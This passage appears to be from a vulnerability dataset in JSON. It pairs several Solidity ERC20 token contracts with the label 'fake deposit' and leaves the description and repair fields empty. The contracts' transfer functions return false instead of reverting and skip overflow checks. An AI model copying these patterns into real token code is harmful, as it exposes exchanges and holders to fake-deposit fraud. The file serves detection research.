            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.4;\r\n\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    \r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\n\r\n//name this contract whatever you'd like\r\ncontract ERC20Token is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n\r\n    /*\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n    */\r\n    string public name;                   //fancy name: eg Simon Bucks\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\r\n    string public symbol;                 //An identifier: eg SBX\r\n    string public version = 'H1.0';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n//\r\n// CHANGE THESE VALUES FOR YOUR TOKEN\r\n//\r\n\r\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\n\r\n    function ERC20Token(\r\n        ) {\r\n        balances[msg.sender] = 20000;               // Give the creator all initial tokens (100000 for example)\r\n        totalSupply = 100000;                        // Update total supply (100000 for example)\r\n        name = \"Miko Coin\";                                   // Set the name for display purposes\r\n        decimals = 0;                            // Amount of decimals for display purposes\r\n        symbol = \"MIKOCOIN\";                               // Set the symbol for display purposes\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.25;\r\n\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n\r\n}\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n    \r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n     \r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\ncontract MoonDoge is StandardToken { \r\n\r\n    /* Public variables of the token */\r\n\r\n    /*\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n    */\r\n    string public name;                  \r\n    uint8 public decimals;                \r\n    string public symbol;                 \r\n    string public version = 'MOGE1.0'; \r\n    uint256 public unitsOneEthCanBuy;     \r\n    uint256 public totalEthInWei;         \r\n    address public fundsWallet;           \r\n\r\n   \r\n    function MoonDoge() {\r\n        balances[msg.sender] = 10000000000000000000000000000;               \r\n        totalSupply = 10000000000000000000000000000;\r\n        name = \"Moon Doge\";\r\n        decimals = 18;                                               \r\n        symbol = \"MOGE\";                                             \r\n        unitsOneEthCanBuy = 0;          //7% bonus= OneEth//                           \r\n        fundsWallet = msg.sender;                                    \r\n    }\r\n\r\n    function() payable{\r\n        totalEthInWei = totalEthInWei + msg.value;\r\n        uint256 amount = msg.value * unitsOneEthCanBuy;\r\n        require(balances[fundsWallet] >= amount);\r\n\r\n        balances[fundsWallet] = balances[fundsWallet] - amount;\r\n        balances[msg.sender] = balances[msg.sender] + amount;\r\n\r\n        Transfer(fundsWallet, msg.sender, amount); \r\n\r\n        fundsWallet.transfer(msg.value);                               \r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n       \r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "/**\r\n *Submitted for verification at Etherscan.io on 2020-05-15\r\n*/\r\n\r\npragma solidity ^0.4.20;\r\n\r\ncontract Token {\r\n\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n    \r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n\r\n}\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n\r\n            balances[msg.sender] -= _value;\r\n\r\n            balances[_to] += _value;\r\n\r\n            Transfer(msg.sender, _to, _value);\r\n\r\n            return true;\r\n\r\n        } else { return false; }\r\n\r\n    }\r\n\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n\r\n            balances[_to] += _value;\r\n\r\n            balances[_from] -= _value;\r\n\r\n            allowed[_from][msg.sender] -= _value;\r\n\r\n            Transfer(_from, _to, _value);\r\n\r\n            return true;\r\n\r\n        } else { return false; }\r\n\r\n    }\r\n\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n\r\n        return balances[_owner];\r\n\r\n    }\r\n\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n\r\n        allowed[msg.sender][_spender] = _value;\r\n\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        return true;\r\n\r\n    }\r\n\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n\r\n      return allowed[_owner][_spender];\r\n\r\n    }\r\n\r\n\r\n    mapping (address => uint256) balances;\r\n\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n\r\n    uint256 public totalSupply;\r\n\r\n}\r\n\r\n\r\n//name this contract whatever you'd like\r\n\r\ncontract HAZARDToken is StandardToken {\r\n\r\n\r\n    function () {\r\n\r\n        //if ether is sent to this address, send it back.\r\n\r\n        throw;\r\n\r\n    }\r\n\r\n\r\n    /* Public variables of the token */\r\n\r\n\r\n    /*\r\n\r\n    NOTE:\r\n\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n\r\n    */\r\n\r\n    string public name;                   //fancy name: eg Simon Bucks\r\n\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\r\n\r\n    string public symbol;                 //An identifier: eg SBX\r\n\r\n    string public version = 'H1.0';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n\r\n\r\n    function HAZARDToken(\r\n\r\n        ) {\r\n\r\n        balances[msg.sender] = 100000000000000;              // Give the creator all initial tokens (100000 for example)\r\n\r\n        totalSupply = 100000000000000;                        // Update total supply (100000 for example)\r\n\r\n        name = \"HAZARD\";                                   // Set the name for display purposes\r\n\r\n        decimals = 8;                            // Amount of decimals for display purposes\r\n\r\n        symbol = \"HAZARD\";                               // Set the symbol for display purposes\r\n\r\n    }\r\n\r\n\r\n    /* Approves and then calls the receiving contract */\r\n\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n\r\n        allowed[msg.sender][_spender] = _value;\r\n\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n\r\n        return true;\r\n\r\n    }\r\n\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.4;\r\n\r\ncontract Token {\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n        return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\ncontract ERC20Token is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n    string public name;                   //Name of the token\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals\r\n    string public symbol;                 //An identifier: eg AXM\r\n    string public version = 'H1.0';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n//\r\n// CHANGE THE FOLLOWING VALUES FOR YOUR TOKEN!\r\n//\r\n\r\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\n\r\n    function ERC20Token(\r\n        ) {\r\n        balances[msg.sender] = 20000000000000000;               // Give the creator all initial tokens (100000 for example)\r\n        totalSupply = 20000000000000000;                        // Update total supply (100000 for example)\r\n        name = \"CARBON\";                                   // Set the name for display purposes\r\n        decimals = 8;                            // Amount of decimals\r\n        symbol = \"CRB\";                               // Set the symbol for display purposes\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.5.0;\r\n\r\n/**\r\n * @dev Interface of the ERC20 standard as defined in the EIP. Does not include\r\n * the optional functions; to access them see {ERC20Detailed}.\r\n */\r\ninterface ERC20Interface {\r\n    /**\r\n     * @dev Returns the amount of tokens in existence.\r\n     */\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Returns the amount of tokens owned by `account`.\r\n     */\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from the caller's account to `recipient`.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Returns the remaining number of tokens that `spender` will be\r\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\r\n     * zero by default.\r\n     *\r\n     * This value changes when {approve} or {transferFrom} are called.\r\n     */\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\r\n     * that someone may use both the old and the new allowance by unfortunate\r\n     * transaction ordering. One possible solution to mitigate this race\r\n     * condition is to first reduce the spender's allowance to 0 and set the\r\n     * desired value afterwards:\r\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\r\n     *\r\n     * Emits an {Approval} event.\r\n     */\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\r\n     * allowance mechanism. `amount` is then deducted from the caller's\r\n     * allowance.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\r\n     * another (`to`).\r\n     *\r\n     * Note that `value` may be zero.\r\n     */\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    /**\r\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\r\n     * a call to {approve}. `value` is the new allowance.\r\n     */\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ncontract ERC20Base is ERC20Interface {\r\n    // Empty internal constructor, to prevent people from mistakenly deploying\r\n    // an instance of this contract, which should be used via inheritance.\r\n    // constructor () internal { }\r\n    // solhint-disable-previous-line no-empty-blocks\r\n\r\n    mapping (address => uint256) public _balances;\r\n    mapping (address => mapping (address => uint256)) public _allowances;\r\n    uint256 public _totalSupply;\r\n\r\n    function transfer(address _to, uint256 _value) public returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (_balances[msg.sender] >= _value && _value > 0) {\r\n            _balances[msg.sender] -= _value;\r\n            _balances[_to] += _value;\r\n            emit Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { \r\n            return false;\r\n        }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (_balances[_from] >= _value && _allowances[_from][msg.sender] >= _value && _value > 0) {\r\n            _balances[_to] += _value;\r\n            _balances[_from] -= _value;\r\n            _allowances[_from][msg.sender] -= _value;\r\n            emit Transfer(_from, _to, _value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n\r\n    function balanceOf(address _owner) public view returns (uint256 balance) {\r\n        return _balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) public returns (bool success) {\r\n        _allowances[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {\r\n      return _allowances[_owner][_spender];\r\n    }\r\n    \r\n    function totalSupply() public view returns (uint256 total) {\r\n        return _totalSupply;\r\n    }\r\n}\r\n\r\ncontract VGPrime is ERC20Base {\r\n\r\n    string private _name;\r\n    string private _symbol;\r\n    uint8 private _decimals;\r\n    \r\n    constructor (string memory name, string memory symbol, uint8 decimals, uint256 initialSupply) public payable {\r\n        _name = name;\r\n        _symbol = symbol;\r\n        _decimals = decimals;\r\n        _totalSupply = initialSupply;\r\n        _balances[msg.sender] = initialSupply;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the name of the token.\r\n     */\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the symbol of the token, usually a shorter version of the\r\n     * name.\r\n     */\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the number of decimals used to get its user representation.\r\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\r\n     * be displayed to a user as `5,05` (`505 / 10 ** 2`).\r\n     *\r\n     * Tokens usually opt for a value of 18, imitating the relationship between\r\n     * Ether and Wei.\r\n     *\r\n     * NOTE: This information is only used for _display_ purposes: it in\r\n     * no way affects any of the arithmetic of the contract, including\r\n     * {IERC20-balanceOf} and {IERC20-transfer}.\r\n     */\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.25;\r\n\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n\r\n}\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n    \r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n     \r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\ncontract MemePetToken is StandardToken { \r\n\r\n    /* Public variables of the token */\r\n\r\n    /*\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n    */\r\n    string public name;                  \r\n    uint8 public decimals;                \r\n    string public symbol;                 \r\n    string public version = 'PET1.0'; \r\n    uint256 public unitsOneEthCanBuy;     \r\n    uint256 public totalEthInWei;         \r\n    address public fundsWallet;           \r\n\r\n   \r\n    function MemePetToken() {\r\n        balances[msg.sender] = 100000000000000000000000000000;               \r\n        totalSupply = 100000000000000000000000000000;\r\n        name = \"MemePet Token\";\r\n        decimals = 18;                                               \r\n        symbol = \"PET\";                                             \r\n        unitsOneEthCanBuy = 0;          //7% bonus= OneEth//                           \r\n        fundsWallet = msg.sender;                                    \r\n    }\r\n\r\n    function() payable{\r\n        totalEthInWei = totalEthInWei + msg.value;\r\n        uint256 amount = msg.value * unitsOneEthCanBuy;\r\n        require(balances[fundsWallet] >= amount);\r\n\r\n        balances[fundsWallet] = balances[fundsWallet] - amount;\r\n        